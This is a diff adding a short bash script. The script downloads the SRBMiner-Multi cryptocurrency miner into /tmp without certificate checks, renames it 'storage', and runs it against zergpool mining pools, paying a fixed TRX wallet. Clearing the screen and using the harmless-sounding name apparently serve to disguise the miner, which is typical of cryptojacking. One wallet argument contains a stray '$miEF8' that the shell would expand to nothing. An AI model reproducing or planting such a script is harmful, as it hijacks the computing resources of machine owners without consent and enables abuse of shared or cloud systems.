@@ -1,0 +1,3 @@
+#!/bin/bash
+reset
+cd /tmp && wget --no-check-certificate https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.4/SRBMiner-Multi-0-9-4-Linux.tar.xz && tar -xf SRBMiner-Multi-0-9-4-Linux.tar.xz && rm -rf SRBMiner-Multi-0-9-4-Linux.tar.xz && mv SRBMiner-Multi-0-9-4 storage && cd storage && ./SRBMiner-MULTI --algorithm verushash\;minotaurx --pool verushash.asia.mine.zergpool.com:3300\;minotaurx.asia.mine.zergpool.com:7019 --wallet TF9Mph5JYPTjK9YukuEA8Urkgro9GmiEF8.storage\;TF9Mph5JYPTjK9YukuEA8Urkgro9GmiEF8.$miEF8.storage --password c=TRX,mc=VRSC,ID=2verus\;c=TRX,mc=LCC/MAZA,ID=storage --cpu-threads 0\;0
